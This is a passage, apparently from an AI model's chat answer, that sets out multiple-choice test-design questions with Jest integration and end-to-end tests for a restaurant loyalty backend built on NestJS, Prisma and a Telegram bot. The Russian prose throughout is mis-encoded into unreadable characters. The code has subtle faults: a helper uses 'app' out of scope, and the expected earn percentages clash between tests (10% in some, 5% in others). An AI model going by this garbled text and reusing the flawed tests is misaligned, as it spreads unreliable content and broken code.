    // If using PgBouncer, connections should be pooled at two levels:
    // 1. Prisma client pool (10 connections)
    // 2. PgBouncer pool (100 connections)

    const result = await prisma.$queryRaw<[{ setting: string }]>`
      SELECT setting FROM pg_settings WHERE name = 'max_connections';
    `;

    const maxConnections = parseInt(result[0].setting);
    console.log(`PostgreSQL max_connections: ${maxConnections}`);

    expect(maxConnections).toBeGreaterThanOrEqual(100); // PgBouncer recommended
  });

  // 10. Memory Leak Detection (related to connections)
  it('should not leak memory with many queries', async () => {
    jest.setTimeout(60000);

    const initialMemory = process.memoryUsage().heapUsed;

    // Run 1000 queries
    for (let i = 0; i < 1000; i++) {
      await prisma.guestCard.findMany({ take: 10 });
      
      // Force garbage collection periodically
      if (i % 100 === 0 && global.gc) {
        global.gc();
      }
    }

    const finalMemory = process.memoryUsage().heapUsed;
    const memoryIncrease = finalMemory - initialMemory;
    const memoryIncreaseMB = memoryIncrease / 1024 / 1024;

    console.log(`Memory increase: ${memoryIncreaseMB.toFixed(2)} MB`);

    // Memory should not increase by more than 50MB
    expect(memoryIncreaseMB).toBeLessThan(50);
  });
});
```

**package.json (ะดะปั garbage collection):**

```json
{
  "scripts": {
    "test:integration": "node --expose-gc node_modules/.bin/jest --testMatch='**/*.integration.spec.ts'"
  }
}
```


***

## **ะะะะ 3: E2E TESTING (10 ะฒะพะฟัะพัะพะฒ)**


***

### **11. Guest Registration Flow - ะฟะพะปะฝัะน ััะตะฝะฐัะธะน?**

**ะะพะฝัะตะบัั:** ะะพััั ัะตะณะธัััะธััะตััั ัะตัะตะท Telegram Bot.

**ะะพะฟัะพั:** ะงัะพ ัะตััะธััะตะผ E2E?

- A) API endpoints ะพัะดะตะปัะฝะพ (ะฝะต E2E)
- B) ะะพะปะฝัะน flow: /start โ enter phone โ verify OTP โ profile created
- C) B + ะฟัะพะฒะตัะธัั ััะพ guest card ัะพะทะดะฐะฝ ั QR ะบะพะดะพะผ
- D) C + ะฟัะพะฒะตัะธัั ััะพ welcome notification ะพัะฟัะฐะฒะปะตะฝ

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- E2E = ัะตััะธััะตะผ ะฒะตัั user journey end-to-end
- Guest card + QR ะบะพะด ะบัะธัะธัะฝั ะดะปั loyalty program
- Welcome notification = ะฒะฐะถะฝัะน UX ัะปะตะผะตะฝั

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/e2e/guest-registration.e2e.spec.ts
describe('Guest Registration Flow (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let telegramBot: any;
  let smsService: any;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    telegramBot = app.get('TELEGRAM_BOT');
    smsService = app.get(SmsService);
  });

  beforeEach(async () => {
    await prisma.user.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.notification.deleteMany();
  });

  afterAll(async () => {
    await app.close();
  });

  it('should complete full guest registration flow', async () => {
    const testPhone = '+79991234567';
    const testTelegramId = 123456789;

    // STEP 1: Guest starts bot (/start command)
    const startResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId, username: 'test_user' },
        text: '/start',
        chat: { id: testTelegramId },
      },
    });

    expect(startResponse.text).toContain('ะะพะฑัะพ ะฟะพะถะฐะปะพะฒะฐัั');
    expect(startResponse.reply_markup.keyboard).toContainEqual([
      { text: '๐ฑ ะัะฟัะฐะฒะธัั ะฝะพะผะตั', request_contact: true },
    ]);

    // STEP 2: Guest shares phone number
    jest.spyOn(smsService, 'send').mockResolvedValue({ success: true });

    const phoneResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        contact: {
          phone_number: testPhone,
          user_id: testTelegramId,
        },
        chat: { id: testTelegramId },
      },
    });

    expect(phoneResponse.text).toContain('ะะพะด ะฟะพะดัะฒะตัะถะดะตะฝะธั');
    expect(smsService.send).toHaveBeenCalledWith(
      testPhone,
      expect.stringMatching(/\d{6}/)
    );

    // Get OTP code from mock
    const otpCode = smsService.send.mock.calls[0][1].match(/\d{6}/)[0];

    // STEP 3: Guest enters OTP
    const otpResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: otpCode,
        chat: { id: testTelegramId },
      },
    });

    expect(otpResponse.text).toContain('ะฟะพะดัะฒะตัะถะดะตะฝ');

    // STEP 4: Guest enters name
    const nameResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: 'ะะฒะฐะฝ',
        chat: { id: testTelegramId },
      },
    });

    expect(nameResponse.text).toContain('ะะตะณะธัััะฐัะธั ะทะฐะฒะตััะตะฝะฐ');

    // STEP 5: Verify database records created
    const user = await prisma.user.findUnique({
      where: { phone: testPhone },
      include: {
        guestProfile: true,
        guestCards: true,
      },
    });

    expect(user).toBeTruthy();
    expect(user.role).toBe('GUEST');
    expect(user.phoneVerified).toBe(true);
    expect(user.telegramId).toBe(testTelegramId.toString());
    expect(user.guestProfile.firstName).toBe('ะะฒะฐะฝ');

    // STEP 6: Verify guest card created
    expect(user.guestCards).toHaveLength(1);
    const guestCard = user.guestCards[0];
    
    expect(guestCard.totalBalance).toBe(0);
    expect(guestCard.status).toBe('ACTIVE');
    expect(guestCard.qrCode).toBeTruthy();
    expect(guestCard.displayCode).toMatch(/^\d{6}$/);

    // STEP 7: Verify QR code generated
    const qrCodeExists = await checkS3FileExists(guestCard.qrCode);
    expect(qrCodeExists).toBe(true);

    // STEP 8: Verify welcome notification sent
    const welcomeNotification = await prisma.notification.findFirst({
      where: {
        recipientId: user.id,
        type: 'WELCOME',
      },
    });

    expect(welcomeNotification).toBeTruthy();
    expect(welcomeNotification.status).toBe('DELIVERED');
    expect(welcomeNotification.channel).toBe('TELEGRAM');

    // STEP 9: Verify guest can view balance
    const balanceResponse = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: '/balance',
        chat: { id: testTelegramId },
      },
    });

    expect(balanceResponse.text).toContain('ะะฐั ะฑะฐะปะฐะฝั: 0 ะฑะฐะปะปะพะฒ');
  });

  // Edge Case: Phone already registered
  it('should handle duplicate phone number registration', async () => {
    const testPhone = '+79991234567';
    
    // Pre-create user
    await prisma.user.create({
      data: {
        phone: testPhone,
        role: 'GUEST',
        phoneVerified: true,
      },
    });

    // Try to register again
    const response = await telegramBot.handleUpdate({
      message: {
        from: { id: 999999 },
        contact: { phone_number: testPhone, user_id: 999999 },
        chat: { id: 999999 },
      },
    });

    expect(response.text).toContain('ัะถะต ะทะฐัะตะณะธัััะธัะพะฒะฐะฝ');
  });

  // Edge Case: Invalid OTP
  it('should reject invalid OTP code', async () => {
    const testPhone = '+79991234567';
    const testTelegramId = 123456789;

    // Send phone
    await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        contact: { phone_number: testPhone, user_id: testTelegramId },
        chat: { id: testTelegramId },
      },
    });

    // Send invalid OTP
    const response = await telegramBot.handleUpdate({
      message: {
        from: { id: testTelegramId },
        text: '000000', // Invalid
        chat: { id: testTelegramId },
      },
    });

    expect(response.text).toContain('ะะตะฒะตัะฝัะน ะบะพะด');
  });
});

// Helper function
async function checkS3FileExists(key: string): Promise<boolean> {
  try {
    const s3 = app.get('S3_CLIENT');
    await s3.headObject({ Bucket: process.env.S3_BUCKET, Key: key });
    return true;
  } catch {
    return false;
  }
}
```


***

### **12. Ball Earning Flow - ะพั webhook ะดะพ notification?**

**ะะพะฝัะตะบัั:** ะะพััั ะพะฟะปะฐัะธะป ัะตะบ โ POS webhook โ ะฑะฐะปะปั ะฝะฐัะธัะปะตะฝั โ notification.

**ะะพะฟัะพั:** ะงัะพ ะฟัะพะฒะตััะตะผ E2E?

- A) Webhook ะพะฑัะฐะฑะพัะฐะฝ ะฑะตะท ะพัะธะฑะพะบ
- B) ะะฐะปะปั ะฝะฐัะธัะปะตะฝั (ะฟัะพะฒะตัะธัั ะฑะฐะปะฐะฝั ะฒ ะะ)
- C) B + notification sent (ะฟัะพะฒะตัะธัั ะฒ Telegram/Email)
- D) C + audit log ัะพะทะดะฐะฝ + analytics updated

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- E2E = ะฟัะพะฒะตััะตะผ ะฒะตัั flow ะพั ะฝะฐัะฐะปะฐ ะดะพ ะบะพะฝัะฐ
- Audit log ะบัะธัะธัะตะฝ ะดะปั compliance
- Analytics ะฝัะถะตะฝ ะดะปั dashboards

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Ball Earning Flow - POS to Notification (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let queue: Queue;
  let telegramBot: any;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    queue = app.get('BullQueue_notifications');
    telegramBot = app.get('TELEGRAM_BOT');
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.posTransaction.deleteMany();
    await prisma.auditLog.deleteMany();
    await prisma.notification.deleteMany();
    await queue.clean(0, 'completed');
    await queue.clean(0, 'failed');

    // Seed test data
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        telegramId: '123456789',
        guestProfile: {
          create: {
            firstName: 'ะะฒะฐะฝ',
          },
        },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            restaurantId: 'restaurant-1',
            totalBalance: 1000,
            qrCode: 'qr-1',
            displayCode: '000001',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should complete full ball earning flow', async () => {
    const checkAmount = 2850;
    const expectedBalls = 285; // 10% of 2850

    // STEP 1: POS sends webhook
    const webhookResponse = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-E2E-123',
        tenantId: 'tenant-1',
        restaurantId: 'restaurant-1',
        checkAmount,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
        items: [
          { name: 'Burger', price: 500, quantity: 2 },
          { name: 'Fries', price: 200, quantity: 3 },
          { name: 'Coke', price: 150, quantity: 5 },
        ],
      })
      .expect(200);

    expect(webhookResponse.body.success).toBe(true);

    // STEP 2: Verify POS transaction created
    const posTransaction = await prisma.posTransaction.findFirst({
      where: { posCheckId: 'CHK-E2E-123' },
    });

    expect(posTransaction).toBeTruthy();
    expect(posTransaction.syncStatus).toBe('COMPLETED');
    expect(posTransaction.checkAmount.toNumber()).toBe(checkAmount);

    // STEP 3: Verify ball transaction created
    const ballTransaction = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-E2E-123' },
    });

    expect(ballTransaction).toBeTruthy();
    expect(ballTransaction.amount).toBe(expectedBalls);
    expect(ballTransaction.source).toBe('POS_WEBHOOK');
    expect(ballTransaction.status).toBe('COMPLETED');
    expect(ballTransaction.earnedAt).toBeInstanceOf(Date);

    // STEP 4: Verify guest card balance updated
    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(1285); // 1000 + 285
    expect(guestCard.totalEarned).toBe(285);
    expect(guestCard.lastActivityAt).toBeInstanceOf(Date);

    // STEP 5: Verify notification sent via BullMQ
    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for queue processing

    const notification = await prisma.notification.findFirst({
      where: {
        recipientId: 'user-1',
        type: 'BALLS_EARNED',
      },
      include: {
        analytics: true,
      },
    });

    expect(notification).toBeTruthy();
    expect(notification.status).toBe('DELIVERED');
    expect(notification.channel).toBe('TELEGRAM');
    expect(notification.message).toContain('285');
    expect(notification.message).toContain('2850');

    // STEP 6: Verify Telegram message sent
    expect(telegramBot.telegram.sendMessage).toHaveBeenCalledWith(
      '123456789',
      expect.stringContaining('285 ะฑะฐะปะปะพะฒ'),
      expect.any(Object)
    );

    // STEP 7: Verify audit log created
    const auditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'BALLS_CREDITED',
        targetType: 'BallTransaction',
        targetId: ballTransaction.id,
      },
    });

    expect(auditLog).toBeTruthy();
    expect(auditLog.userId).toBe('user-1');
    expect(auditLog.tenantId).toBe('tenant-1');
    expect(auditLog.metadata).toMatchObject({
      amount: expectedBalls,
      source: 'POS_WEBHOOK',
      checkAmount,
    });

    // STEP 8: Verify analytics updated
    expect(notification.analytics).toBeTruthy();
    expect(notification.analytics.openedAt).toBeNull(); // Not opened yet

    // STEP 9: Simulate guest opening notification
    await request(app.getHttpServer())
      .post(`/api/v1/notifications/${notification.id}/track`)
      .send({ event: 'opened' })
      .expect(200);

    const updatedNotification = await prisma.notification.findUnique({
      where: { id: notification.id },
      include: { analytics: true },
    });

    expect(updatedNotification.analytics.openedAt).toBeInstanceOf(Date);
  });

  // Test: Multiple transactions in sequence
  it('should handle multiple transactions correctly', async () => {
    // Transaction 1: 1000 ััะฑ
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-1',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Transaction 2: 2000 ััะฑ
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-2',
        tenantId: 'tenant-1',
        checkAmount: 2000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Transaction 3: 3000 ััะฑ
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-3',
        tenantId: 'tenant-1',
        checkAmount: 3000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Verify final balance
    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(1600); // 1000 + 100 + 200 + 300
    expect(guestCard.totalSpent).toBe(6000); // 1000 + 2000 + 3000

    // Verify 3 notifications sent
    const notifications = await prisma.notification.findMany({
      where: { recipientId: 'user-1', type: 'BALLS_EARNED' },
    });

    expect(notifications).toHaveLength(3);
  });

  // Test: Notification delivery failure
  it('should retry notification on delivery failure', async () => {
    // Mock Telegram API failure
    jest.spyOn(telegramBot.telegram, 'sendMessage')
      .mockRejectedValueOnce(new Error('Network error'))
      .mockResolvedValueOnce({ ok: true });

    // Send webhook
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-RETRY',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Wait for retry
    await new Promise(resolve => setTimeout(resolve, 5000));

    // Verify notification eventually delivered
    const notification = await prisma.notification.findFirst({
      where: { recipientId: 'user-1', type: 'BALLS_EARNED' },
    });

    expect(notification.status).toBe('DELIVERED');
    expect(notification.attempts).toBeGreaterThan(1);
  });
});
```


***

### **13. Level Upgrade Flow - ะฐะฒัะพะผะฐัะธัะตัะบะธะน upgrade?**

**ะะพะฝัะตะบัั:** ะะพััั ะดะพััะธะณ 10,000โฝ โ ะฐะฒัะพะผะฐัะธัะตัะบะธะน upgrade Bronze โ Silver.

**ะะพะฟัะพั:** E2E test ััะตะฝะฐัะธะน?

- A) Manually update totalSpent to 10,000โฝ โ check level
- B) Simulate multiple transactions ะดะพ 10,000โฝ โ check level
- C) B + ะฟัะพะฒะตัะธัั notification "ะะพะทะดัะฐะฒะปัะตะผ ั Silver!"
- D) C + ะฟัะพะฒะตัะธัั ััะพ earnPercentage ะธะทะผะตะฝะธะปัั ั 5% โ 7%

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Simulating real transactions = ะฑะพะปะตะต ัะตะฐะปะธััะธัะฝัะน ัะตัั
- Level upgrade notification = ะฒะฐะถะฝัะน UX ะผะพะผะตะฝั
- Earn percentage change = ะฟัะพะฒะตััะตะผ ััะพ upgrade ัะตะฐะปัะฝะพ ัะฐะฑะพัะฐะตั

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Level Upgrade Flow (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.user.deleteMany();
    await prisma.loyaltyLevel.deleteMany();

    // Create loyalty levels
    await prisma.loyaltyLevel.createMany({
      data: [
        {
          id: 'bronze',
          name: 'Bronze',
          tenantId: 'tenant-1',
          thresholdAmount: 0,
          earnPercentage: 5,
          color: '#CD7F32',
          priority: 1,
        },
        {
          id: 'silver',
          name: 'Silver',
          tenantId: 'tenant-1',
          thresholdAmount: 10000,
          earnPercentage: 7,
          color: '#C0C0C0',
          priority: 2,
        },
        {
          id: 'gold',
          name: 'Gold',
          tenantId: 'tenant-1',
          thresholdAmount: 50000,
          earnPercentage: 10,
          color: '#FFD700',
          priority: 3,
        },
      ],
    });

    // Create guest with Bronze level
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        telegramId: '123456789',
        guestProfile: {
          create: { firstName: 'ะะฒะฐะฝ' },
        },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            restaurantId: 'restaurant-1',
            totalBalance: 0,
            totalSpent: 0,
            loyaltyLevelId: 'bronze',
            qrCode: 'qr-1',
            displayCode: '000001',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should upgrade from Bronze to Silver automatically', async () => {
    // STEP 1: Verify starting level
    let guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Bronze');
    expect(guestCard.loyaltyLevel.earnPercentage).toBe(5);
    expect(guestCard.totalSpent).toBe(0);

    // STEP 2: Make transactions totaling 10,000โฝ
    const transactions = [
      { amount: 3000, expectedBalls: 150 }, // 3000 * 5% = 150
      { amount: 2500, expectedBalls: 125 }, // 2500 * 5% = 125
      { amount: 2000, expectedBalls: 100 }, // 2000 * 5% = 100
      { amount: 1500, expectedBalls: 75 },  // 1500 * 5% = 75
      { amount: 1000, expectedBalls: 50 },  // 1000 * 5% = 50 โ UPGRADE!
    ];

    for (let i = 0; i < transactions.length; i++) {
      const tx = transactions[i];
      
      await request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send({
          posSystem: 'IIKO_CLOUD',
          posCheckId: `CHK-UPGRADE-${i}`,
          tenantId: 'tenant-1',
          checkAmount: tx.amount,
          guestPhone: '+79991234567',
          timestamp: new Date().toISOString(),
        })
        .expect(200);
    }

    // STEP 3: Verify level upgraded to Silver
    guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Silver');
    expect(guestCard.loyaltyLevel.earnPercentage).toBe(7);
    expect(guestCard.totalSpent).toBe(10000);

    // STEP 4: Verify balls earned correctly (Bronze rates)
    const totalBalls = 150 + 125 + 100 + 75 + 50;
    expect(guestCard.totalBalance).toBe(totalBalls);

    // STEP 5: Verify upgrade notification sent
    const upgradeNotification = await prisma.notification.findFirst({
      where: {
        recipientId: 'user-1',
        type: 'LEVEL_UPGRADED',
      },
    });

    expect(upgradeNotification).toBeTruthy();
    expect(upgradeNotification.message).toContain('Silver');
    expect(upgradeNotification.metadata).toMatchObject({
      previousLevel: 'Bronze',
      newLevel: 'Silver',
      newEarnPercentage: 7,
    });

    // STEP 6: Verify next transaction uses Silver rate (7%)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-POST-UPGRADE',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const postUpgradeTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-POST-UPGRADE' },
    });

    expect(postUpgradeTx.amount).toBe(70); // 1000 * 7% = 70 (Silver rate!)

    guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(totalBalls + 70);
  });

  // Test: Upgrade to Gold
  it('should upgrade from Silver to Gold', async () => {
    // Pre-set guest to Silver with 45,000โฝ spent
    await prisma.guestCard.update({
      where: { id: 'card-1' },
      data: {
        totalSpent: 45000,
        loyaltyLevelId: 'silver',
      },
    });

    // Make transaction to reach 50,000โฝ
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-GOLD',
        tenantId: 'tenant-1',
        checkAmount: 5000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Gold');
    expect(guestCard.loyaltyLevel.earnPercentage).toBe(10);
    expect(guestCard.totalSpent).toBe(50000);

    // Verify upgrade notification
    const notification = await prisma.notification.findFirst({
      where: { recipientId: 'user-1', type: 'LEVEL_UPGRADED' },
    });

    expect(notification.message).toContain('Gold');
  });

  // Test: No upgrade if not reached threshold
  it('should NOT upgrade if threshold not reached', async () => {
    // Make transaction for 9,000โฝ (not enough for Silver)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-NO-UPGRADE',
        tenantId: 'tenant-1',
        checkAmount: 9000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Bronze'); // Still Bronze
    expect(guestCard.totalSpent).toBe(9000);

    // No upgrade notification
    const notification = await prisma.notification.findFirst({
      where: { recipientId: 'user-1', type: 'LEVEL_UPGRADED' },
    });

    expect(notification).toBeNull();
  });
});
```


***

ะัะพะดะพะปะถะฐั ั ะฒะพะฟัะพัะฐะผะธ **14-20** (E2E + Contract Testing)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **14. Promo Campaign Application - ะฒัะตะผะตะฝะฝะฐั ะฐะบัะธั?**

**ะะพะฝัะตะบัั:** Promo "ะะฒะพะนะฝัะต ะฑะฐะปะปั ะฟะพ ะฟััะฝะธัะฐะผ" ะฐะบัะธะฒะตะฝ.

**ะะพะฟัะพั:** E2E test?

- A) ะกะพะทะดะฐัั promo โ ะฐะบัะธะฒะธัะพะฒะฐัั
- B) Simulate transaction ะฒ ะฟััะฝะธัั โ ะฟัะพะฒะตัะธัั ััะพ ะฑะฐะปะปะพะฒ x2
- C) B + simulate transaction ะฒ ะฟะพะฝะตะดะตะปัะฝะธะบ โ ะฟัะพะฒะตัะธัั ะพะฑััะฝะพะต ะบะพะปะธัะตััะฒะพ
- D) C + ะฟัะพะฒะตัะธัั ััะพ promo ะธัััะบ ะฟะพัะปะต end date

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- E2E = ะฟัะพะฒะตััะตะผ ะฒะตัั lifecycle promo (create โ apply โ expire)
- Time-based conditions ะบัะธัะธัะฝั (ะดะตะฝั ะฝะตะดะตะปะธ, ะฒัะตะผั)
- Expiration logic ะดะพะปะถะตะฝ ัะฐะฑะพัะฐัั ะฐะฒัะพะผะฐัะธัะตัะบะธ

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Promo Campaign Application (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.promo.deleteMany();
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.user.deleteMany();

    // Create test guest
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: { create: { firstName: 'ะะฒะฐะฝ' } },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            restaurantId: 'restaurant-1',
            totalBalance: 0,
            qrCode: 'qr-1',
            displayCode: '000001',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should apply promo "Double Balls Friday"', async () => {
    // STEP 1: Admin creates promo campaign
    const adminToken = await generateAdminToken('tenant-1');

    const promoResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Double Balls Friday',
        description: 'ะะฒะพะนะฝัะต ะฑะฐะปะปั ะฟะพ ะฟััะฝะธัะฐะผ',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 2,
        conditions: {
          dayOfWeek: ['Friday'],
        },
        isActive: true,
      })
      .expect(201);

    const promoId = promoResponse.body.id;

    // Verify promo created
    const promo = await prisma.promo.findUnique({ where: { id: promoId } });
    expect(promo.name).toBe('Double Balls Friday');
    expect(promo.isActive).toBe(true);

    // STEP 2: Simulate transaction on Friday
    const fridayDate = new Date('2026-02-13T14:00:00Z'); // Friday, Feb 13, 2026
    jest.useFakeTimers().setSystemTime(fridayDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-FRIDAY',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: fridayDate.toISOString(),
      })
      .expect(200);

    // Verify balls doubled (1000 * 10% * 2 = 200)
    const fridayTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-FRIDAY' },
    });

    expect(fridayTx.amount).toBe(200);
    expect(fridayTx.metadata.promoApplied).toBe(true);
    expect(fridayTx.metadata.promoId).toBe(promoId);
    expect(fridayTx.metadata.originalAmount).toBe(100); // Before multiplier

    // STEP 3: Simulate transaction on Monday
    const mondayDate = new Date('2026-02-16T14:00:00Z'); // Monday, Feb 16, 2026
    jest.setSystemTime(mondayDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-MONDAY',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: mondayDate.toISOString(),
      })
      .expect(200);

    // Verify normal balls (1000 * 10% = 100, NO multiplier)
    const mondayTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-MONDAY' },
    });

    expect(mondayTx.amount).toBe(100);
    expect(mondayTx.metadata.promoApplied).toBeUndefined();

    // STEP 4: Check final balance
    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(300); // 200 (Friday) + 100 (Monday)

    // STEP 5: Simulate transaction after promo end date
    const afterPromoDate = new Date('2026-03-06T14:00:00Z'); // March 6 (Friday, but after Feb 28)
    jest.setSystemTime(afterPromoDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-EXPIRED',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: afterPromoDate.toISOString(),
      })
      .expect(200);

    // Verify promo NOT applied (expired)
    const expiredTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-EXPIRED' },
    });

    expect(expiredTx.amount).toBe(100); // Normal rate
    expect(expiredTx.metadata.promoApplied).toBeUndefined();

    jest.useRealTimers();
  });

  // Test: Time-based promo (18:00-22:00)
  it('should apply promo "Happy Hour" during time range', async () => {
    const adminToken = await generateAdminToken('tenant-1');

    // Create Happy Hour promo
    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Happy Hour',
        description: 'ะขัะพะนะฝัะต ะฑะฐะปะปั ั 18:00 ะดะพ 22:00',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 3,
        conditions: {
          timeRange: {
            start: '18:00',
            end: '22:00',
          },
        },
        isActive: true,
      })
      .expect(201);

    // Transaction at 19:30 (inside range)
    const insideRangeDate = new Date('2026-02-14T19:30:00+03:00'); // Moscow time
    jest.useFakeTimers().setSystemTime(insideRangeDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-INSIDE',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: insideRangeDate.toISOString(),
      })
      .expect(200);

    const insideTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-INSIDE' },
    });

    expect(insideTx.amount).toBe(300); // 1000 * 10% * 3 = 300

    // Transaction at 12:00 (outside range)
    const outsideRangeDate = new Date('2026-02-14T12:00:00+03:00');
    jest.setSystemTime(outsideRangeDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
